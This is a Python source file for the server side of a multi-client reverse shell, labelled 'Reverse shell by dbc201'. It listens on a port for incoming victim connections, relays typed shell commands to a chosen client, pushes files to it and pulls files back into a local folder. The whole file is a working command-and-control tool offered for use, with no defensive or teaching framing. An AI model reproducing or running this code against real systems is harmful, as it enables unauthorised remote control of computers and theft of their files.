import socket
import threading
from queue import Queue
import os
import shlex
import sys, argparse


class Server:
    def __init__(self, port):
        try:
            self.port = port
            self.sock = socket.socket()
            self.sock.bind(('', self.port))
            self.sock.listen(5)  # will end connection after 5 bad attempts
            self.accepted = []
            self.threads = Queue()
            print("Listening to port:", self.port)
        except Exception as e:
            raise e

    def run(self):
        listening_thread = threading.Thread(target=self.__listen, daemon=True)
        ui_thread = threading.Thread(target=self.__ui, daemon=True)

        self.threads.put(listening_thread)
        self.threads.put(ui_thread)

        listening_thread.start()
        ui_thread.start()

        self.threads.join()

    def kill_threads(self):  # kills the jobs in order to quit
        while not self.threads.empty():
            self.threads.get()
            self.threads.task_done()

    def __listen(self):
        while True:
            accept = self.sock.accept()  # a list of tuples (conn, address)
            print()
            print("Received connection from: " + str(accept[1][0]) + ":" + str(accept[1][1]))
            print("->", end='')
            self.accepted.append(accept)

    def send(self, conn, data): # the way this works could pose issues like getting stuck with infinite loops
        conn.send(data)
        response = conn.recv(1024)
        while response[-2:] != b"->":
            response += conn.recv(1024)
        return response

    def update_clients(self):
        clients = "Current connections\n"
        for i, accept in enumerate(self.accepted):
            try:
                self.send(accept[0], b' ')
            except:
                del self.accepted[i]
            clients += str(i) + ": " + str(accept[1][0]) + ":" + str(accept[1][1]) + '\n'
        return clients

    def save_files(self, files):
        files = files.split(b'FILE_END')[:-1]
        for file in files:
            file = file.split(b'NAME')
            try:
                with open("received_files/" + file[0].decode("utf-8"), "wb") as f:
                    f.write(file[1])
            except FileNotFoundError:
                os.mkdir("received_files")
                with open("received_files/" + file[0].decode("utf-8"), "wb") as f:
                    f.write(file[1])
            except Exception as e:
                print(e)
                print("Error receiving", file)

    def parse_files(self, files):
        parsed = b"FILES"
        for file in files:
            try:
                with open("send/"+file, "rb") as f:
                    parsed += file.encode() + b"NAME" + f.read() + b"FILE_END"
            except FileNotFoundError:
                print("File", file, "doesn't exist!")
            except Exception as e:
                print(e)
                print("Unable to send", file)
        parsed += b"CONN_END"
        return parsed

    def send_kill_signal(self):
        self.update_clients()
        for conn, address in self.accepted:
            conn.send(b"exit")

    def communicate(self, conn):
        try:
            print("Type a command")
            print("->", end='')
            while True:
                command = input().strip()
                if command.lower() == "exit":
                    conn.send("exit".encode())
                    conn.close()
                    return
                if len(command) > 0:
                    command_args = shlex.split(command)
                    if command_args[0] == "send":
                        files = command_args[1:]
                        response = self.send(conn, self.parse_files(files)).decode("utf-8")
                        print(response, end='')
                    else:
                        response = self.send(conn, command.encode())
                        try:
                            if response[:len(b"FILES")] == b"FILES":
                                self.save_files(response[len(b"FILES"): -1*len(b'->')])
                                print("->", end='')
                            else:
                                print(response.decode("utf-8"), end='')
                        except UnicodeDecodeError:
                            lines = response.split(b'\n')
                            for line in lines:
                                if line == lines[-1]:
                                    print(line, end='')
                                else:
                                    print(line)
        except Exception as e:
            print(e)
            print("Failed to send command!")
            self.update_clients()

    def __ui(self):
        print("Reverse shell by dbc201")
        print("Type help for further info")
        while True:
            connect = input("->").strip()
            if connect.lower() == "exit":
                self.send_kill_signal()
                self.kill_threads()
                self.sock.close()
                return
            elif connect.lower() == "help":
                print("Type list to view active connections")
                print("------------------------------------------------------------------")
                print("Type the number of the client to connect")
                print("------------------------------------------------------------------")
                print("Type receive and name of the files to receive files from client")
                print("Files must be in the current directory")
                print("------------------------------------------------------------------")
                print("Type send to send files, you must create a folder called send")
                print("and put the files there")
                print("------------------------------------------------------------------")
                print("Type exit to exit")
            elif connect.lower() == "list":
                print(self.update_clients())
            else:
                try:
                    conn = self.accepted[int(connect)][0]
                    self.communicate(conn)
                except:
                    print("Failed to connect to client!")


def return_parser():
    parser = argparse.ArgumentParser(description="Reverse shell server made by dbc201")
    parser.add_argument("-p", "--port", type=int, dest="port", help="Port the server will connect to")
    return parser


if __name__ == "__main__":
    parser = return_parser()
    args = parser.parse_args(sys.argv[1:])
    port = 41369
    if args.port:
        port = args.port
    server = Server(port)
    server.run()
